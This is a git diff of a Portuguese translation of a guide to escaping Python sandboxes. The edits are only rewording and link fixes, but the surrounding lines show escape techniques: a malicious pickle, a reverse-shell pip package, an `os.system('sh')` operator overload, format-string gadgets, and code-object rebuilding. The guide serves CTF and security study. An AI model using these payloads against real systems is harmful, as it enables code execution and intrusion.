@@ -44,7 +44,7 @@ Lembre-se de que as funções _**open**_ e _**read**_ podem ser úteis para **le
 > [!CAUTION]
 > A função **input()** do Python2 permite executar código python antes que o programa falhe.
 
-O Python tenta **carregar bibliotecas do diretório atual primeiro** (o comando a seguir imprimirá de onde o python está carregando os módulos): `python3 -c 'import sys; print(sys.path)'`
+O Python tenta **carregar bibliotecas do diretório atual primeiro** (o seguinte comando imprimirá de onde o python está carregando os módulos): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
@@ -54,7 +54,7 @@ O Python tenta **carregar bibliotecas do diretório atual primeiro** (o comando 
 
 Você pode encontrar uma **lista de pacotes pré-instalados** aqui: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Note que a partir de um pickle você pode fazer o ambiente python **importar bibliotecas arbitrárias** instaladas no sistema.\
-Por exemplo, o seguinte pickle, quando carregado, irá importar a biblioteca pip para usá-la:
+Por exemplo, o seguinte pickle, quando carregado, vai importar a biblioteca pip para usá-la:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -67,7 +67,7 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-Para mais informações sobre como o pickle funciona, consulte isto: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+Para mais informações sobre como o pickle funciona, verifique isto: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pacote Pip
 
@@ -83,7 +83,7 @@ Você pode baixar o pacote para criar o reverse shell aqui. Por favor, note que 
 {% file src="../../../images/Reverse.tar (1).gz" %}
 
 > [!NOTE]
-> Este pacote é chamado `Reverse`. No entanto, ele foi especialmente elaborado para que, ao sair do reverse shell, o restante da instalação falhe, então você **não deixará nenhum pacote python extra instalado no servidor** quando sair.
+> Este pacote é chamado `Reverse`. No entanto, ele foi especialmente elaborado para que, quando você sair do reverse shell, o restante da instalação falhe, então você **não deixará nenhum pacote python extra instalado no servidor** quando sair.
 
 ## Avaliando código python
 
@@ -151,7 +151,7 @@ Também é possível contornar isso usando outras codificações, por exemplo, `
 
 ## Execução do Python sem chamadas
 
-Se você estiver dentro de uma prisão python que **não permite que você faça chamadas**, ainda há algumas maneiras de **executar funções, código** e **comandos** arbitrários.
+Se você estiver dentro de uma prisão python que **não permite que você faça chamadas**, ainda há algumas maneiras de **executar funções, código** e **comandos arbitrários**.
 
 ### RCE com [decorators](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -177,7 +177,7 @@ class _:pass
 ```
 ### RCE criando objetos e sobrecarga
 
-Se você pode **declarar uma classe** e **criar um objeto** dessa classe, você pode **escrever/sobrescrever diferentes métodos** que podem ser **ativados** **sem** **precisar chamá-los diretamente**.
+Se você pode **declarar uma classe** e **criar um objeto** dessa classe, você poderia **escrever/sobrescrever diferentes métodos** que podem ser **ativados** **sem** **precisar chamá-los diretamente**.
 
 #### RCE com classes personalizadas
 
@@ -233,7 +233,7 @@ __ixor__ (k ^= 'import os; os.system("sh")')
 ```
 #### Criando objetos com [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
 
-A principal coisa que as metaclasses nos permitem fazer é **criar uma instância de uma classe, sem chamar o construtor** diretamente, criando uma nova classe com a classe alvo como uma metaclass.
+A principal coisa que as metaclasses nos permitem fazer é **criar uma instância de uma classe, sem chamar o construtor** diretamente, criando uma nova classe com a classe alvo como metaclass.
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
@@ -358,7 +358,7 @@ get_flag.__globals__['__builtins__']
 # Get builtins from loaded classes
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
-[**Abaixo há uma função maior**](./#recursive-search-of-builtins-globals) para encontrar dezenas/**centenas** de **lugares** onde você pode encontrar os **builtins**.
+[**Abaixo há uma função maior**](#recursive-search-of-builtins-globals) para encontrar dezenas/**centenas** de **lugares** onde você pode encontrar os **builtins**.
 
 #### Python2 e Python3
 ```python
@@ -400,7 +400,7 @@ class_obj.__init__.__globals__
 [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
-[**Abaixo há uma função maior**](./#recursive-search-of-builtins-globals) para encontrar dezenas/**centenas** de **lugares** onde você pode encontrar os **globals**.
+[**Abaixo há uma função maior**](#recursive-search-of-builtins-globals) para encontrar dezenas/**centenas** de **lugares** onde você pode encontrar os **globals**.
 
 ## Descobrir Execução Arbitrária
 
@@ -408,7 +408,7 @@ Aqui quero explicar como descobrir facilmente **funcionalidades mais perigosas c
 
 #### Acessando subclasses com bypasses
 
-Uma das partes mais sensíveis desta técnica é ser capaz de **acessar as subclasses base**. Nos exemplos anteriores, isso foi feito usando `''.__class__.__base__.__subclasses__()` mas há **outras maneiras possíveis**:
+Uma das partes mais sensíveis desta técnica é ser capaz de **acessar as subclasses base**. Nos exemplos anteriores, isso foi feito usando `''.__class__.__base__.__subclasses__()`, mas há **outras maneiras possíveis**:
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -537,7 +537,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Pesquisa Recursiva de Builtins, Globals...
 
 > [!WARNING]
-> Isso é simplesmente **incrível**. Se você está **procurando por um objeto como globals, builtins, open ou qualquer outra coisa**, basta usar este script para **encontrar recursivamente lugares onde você pode encontrar esse objeto.**
+> Isso é simplesmente **incrível**. Se você está **procurando por um objeto como globals, builtins, open ou qualquer outra coisa**, apenas use este script para **encontrar recursivamente lugares onde você pode encontrar esse objeto.**
 ```python
 import os, sys # Import these to find more gadgets
 
@@ -659,9 +659,9 @@ Você pode verificar a saída deste script nesta página:
 https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
 {{#endref}}
 
-## Formato de String do Python
+## Python Format String
 
-Se você **enviar** uma **string** para o python que vai ser **formatada**, você pode usar `{}` para acessar **informações internas do python.** Você pode usar os exemplos anteriores para acessar globais ou builtins, por exemplo.
+Se você **enviar** uma **string** para o python que vai ser **formatada**, você pode usar `{}` para acessar **informações internas do python.** Você pode usar os exemplos anteriores para acessar globals ou builtins, por exemplo.
 ```python
 # Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
 CONFIG = {
@@ -681,7 +681,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Note como você pode **acessar atributos** de uma maneira normal com um **ponto** como `people_obj.__init__` e **elemento de dicionário** com **parênteses** sem aspas `__globals__[CONFIG]`
+Note como você pode **acessar atributos** de uma maneira normal com um **ponto** como `people_obj.__init__` e **elemento do dicionário** com **parênteses** sem aspas `__globals__[CONFIG]`
 
 Também note que você pode usar `.__dict__` para enumerar elementos de um objeto `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -703,8 +703,8 @@ return 'HAL 9000'
 ```
 **Mais exemplos** sobre **exemplos de** **string** **de formato** podem ser encontrados em [**https://pyformat.info/**](https://pyformat.info)
 
-> [!ATENÇÃO]
-> Verifique também a seguinte página para gadgets que irão **ler informações sensíveis de objetos internos do Python**:
+> [!CAUTION]
+> Verifique também a seguinte página para gadgets que irão r**evelar informações sensíveis de objetos internos do Python**:
 
 {{#ref}}
 ../python-internal-read-gadgets.md
@@ -736,7 +736,7 @@ De acordo com o [**desafio TypeMonkey deste artigo**](https://corgi.rip/posts/bu
 
 Como lembrete, toda vez que uma ação é realizada em python, alguma função é executada. Por exemplo, `2*3` executará **`(2).mul(3)`** ou **`{'a':'b'}['a']`** será **`{'a':'b'}.__getitem__('a')`**.
 
-Você pode encontrar mais como isso na seção [**Execução de Python sem chamadas**](./#python-execution-without-calls).
+Você pode encontrar mais como isso na seção [**Execução de Python sem chamadas**](#python-execution-without-calls).
 
 Uma vulnerabilidade de string de formato em python não permite executar funções (não permite o uso de parênteses), então não é possível obter RCE como `'{0.system("/bin/sh")}'.format(os)`.\
 No entanto, é possível usar `[]`. Portanto, se uma biblioteca python comum tiver um método **`__getitem__`** ou **`__getattr__`** que executa código arbitrário, é possível abusar deles para obter RCE.
@@ -767,7 +767,7 @@ Este gadget permite **carregar uma biblioteca do disco**. Portanto, é necessár
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-A challenge na verdade explora outra vulnerabilidade no servidor que permite criar arquivos arbitrários no disco dos servidores.
+O desafio na verdade explora outra vulnerabilidade no servidor que permite criar arquivos arbitrários no disco dos servidores.
 
 ## Dissecando Objetos Python
 
@@ -805,7 +805,7 @@ get_flag.__globals__
 #If you have access to some variable value
 CustomClassObject.__class__.__init__.__globals__
 ```
-[**Veja aqui mais lugares para obter globais**](./#globals-and-locals)
+[**Veja aqui mais lugares para obter globais**](#globals-and-locals)
 
 ### **Acessando o código da função**
 
@@ -823,7 +823,7 @@ compile("print(5)", "", "single")
 dir(get_flag.__code__)
 ['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
 ```
-### Obtendo Informações do Código
+### Obtendo Informações de Código
 ```python
 # Another example
 s = '''
@@ -897,7 +897,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Observe que **se você não conseguir importar `dis` no sandbox do python** você pode obter o **bytecode** da função (`get_flag.func_code.co_code`) e **desmontá-lo** localmente. Você não verá o conteúdo das variáveis sendo carregadas (`LOAD_CONST`), mas pode inferi-las a partir de (`get_flag.func_code.co_consts`), pois `LOAD_CONST` também indica o deslocamento da variável sendo carregada.
+Observe que **se você não puder importar `dis` no sandbox do python** você pode obter o **bytecode** da função (`get_flag.func_code.co_code`) e **desmontá-lo** localmente. Você não verá o conteúdo das variáveis sendo carregadas (`LOAD_CONST`), mas pode inferi-las a partir de (`get_flag.func_code.co_consts`), pois `LOAD_CONST` também indica o deslocamento da variável sendo carregada.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -921,7 +921,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Compilando Python
 
-Agora, vamos imaginar que de alguma forma você pode **extrair as informações sobre uma função que você não pode executar**, mas você **precisa** **executá-la**.\
+Agora, vamos imaginar que de alguma forma você pode **extrair as informações sobre uma função que não pode executar** mas você **precisa** **executá-la**.\
 Como no exemplo a seguir, você **pode acessar o objeto de código** dessa função, mas apenas lendo o desmonte você **não sabe como calcular a flag** (_imagine uma função `calc_flag` mais complexa_)
 ```python
 def get_flag(some_input):
@@ -1011,7 +1011,7 @@ mydict['__builtins__'] = __builtins__
 codeobj = code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ())
 function_type(codeobj, mydict, None, None, None)()
 ```
-Se você não pode acessar `eval` ou `exec`, você pode criar uma **função adequada**, mas chamá-la diretamente geralmente falhará com: _construtor não acessível em modo restrito_. Portanto, você precisa de uma **função que não esteja no ambiente restrito para chamar essa função.**
+Se você não pode acessar `eval` ou `exec`, você poderia criar uma **função adequada**, mas chamá-la diretamente geralmente falhará com: _construtor não acessível em modo restrito_. Portanto, você precisa de uma **função que não esteja no ambiente restrito para chamar essa função.**
 ```python
 #Compile a regular print
 ftype = type(lambda: None)
